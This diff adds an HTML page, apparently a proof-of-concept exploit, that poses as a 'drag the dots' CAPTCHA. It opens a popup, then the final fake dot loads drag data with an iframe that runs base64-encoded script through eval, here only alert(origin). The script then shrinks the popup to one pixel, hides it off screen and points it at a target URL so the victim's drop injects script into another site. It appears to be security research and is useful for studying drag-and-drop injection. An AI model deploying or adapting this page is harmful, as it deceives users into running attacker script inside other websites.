@@ -1,0 +1,124 @@
+<meta charset="UTF-8" />
+<link rel="stylesheet" href="style.css" />
+<script src="utils.js"></script>
+<body bgcolor="black">
+  <h1>CAPTCHA</h1>
+  <p><b>Drag</b> all 3 dots to the box on the <b>right</b> (<span id="counter">0</span>/3)</p>
+
+  <div class="game-area">
+    <div class="box" id="left-box"></div>
+    <div class="box" id="right-box"></div>
+  </div>
+  <script>
+    const PAYLOAD = "alert(origin)";
+
+    w = window.open("", "popup");
+
+    backToStartIfClosed();
+    setTimeout(focusMessageBox, 2000);
+
+    ondragstart = () => {
+      event.dataTransfer.clearData();
+      event.dataTransfer.setData("text/plain", `<iframe srcdoc="croexp+jorian=🔥<><script>eval(atob('${btoa(PAYLOAD)}'))<\/script>">`);
+
+      w.focus();
+      // ondragend also works on any other window
+      ondragover = (e) => e.preventDefault(); // Allow drop
+      ondrop = () => {
+        // If dropped on the wrong spot, retry
+        ondragend = null;
+      };
+      ondragend = async () => {
+        w.location = blankBlob();
+        while (true) {
+          try {
+            w.origin;
+            break;
+          } catch {
+            await sleep(0);
+          }
+        }
+        w.resizeTo(1, 1);
+        w.moveTo(9999, 9999);
+        w.location = url;
+        location = "/enter.html";
+      };
+    };
+
+    const leftBox = document.getElementById("left-box");
+    const rightBox = document.getElementById("right-box");
+    const counter = document.getElementById("counter");
+
+    function isInsideBox(x, y, box) {
+      const rect = box.getBoundingClientRect();
+      return x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom;
+    }
+
+    function randomY() {
+      return Math.random() * (leftBox.clientHeight - 50);
+    }
+
+    function spawnDot(x, y) {
+      let dot = document.createElement("div");
+      dot.className = "dot";
+      dot.style.left = x + "px";
+      dot.style.top = y + "px";
+      leftBox.appendChild(dot);
+      return dot;
+    }
+
+    function waitForDot(dot) {
+      return new Promise((resolve) => {
+        let offsetX,
+          offsetY,
+          dragging = false;
+        document.addEventListener("mousedown", (e) => {
+          if (e.target !== dot) return;
+          dragging = true;
+          dot.style.cursor = "grabbing";
+          const rect = dot.getBoundingClientRect();
+          offsetX = e.clientX - rect.left;
+          offsetY = e.clientY - rect.top;
+          dot.style.zIndex = 1000;
+          dot.style.position = "fixed";
+          dot.style.left = e.clientX - offsetX + "px";
+          dot.style.top = e.clientY - offsetY + "px";
+        });
+
+        document.addEventListener("mousemove", (e) => {
+          if (!dragging) return;
+          e.preventDefault();
+          dot.style.left = e.clientX - offsetX + "px";
+          dot.style.top = e.clientY - offsetY + "px";
+        });
+
+        document.addEventListener("mouseup", (e) => {
+          if (!dragging) return;
+          dragging = false;
+          if (isInsideBox(e.clientX, e.clientY, rightBox)) {
+            counter.textContent = parseInt(counter.textContent) + 1;
+            resolve();
+          }
+        });
+      });
+    }
+
+    function spawnFakeDot(x, y) {
+      let dot = document.createElement("div");
+      dot.className = "dot";
+      dot.draggable = true;
+      dot.style.left = x + "px";
+      dot.style.top = y + "px";
+      leftBox.appendChild(dot);
+      return dot;
+    }
+
+    (async () => {
+      await waitForDot(spawnDot(20, randomY()));
+      console.log("First dot placed");
+      await waitForDot(spawnDot(70, randomY()));
+      console.log("Second dot placed");
+      spawnFakeDot(120, randomY());
+    })();
+  </script>
+</body>
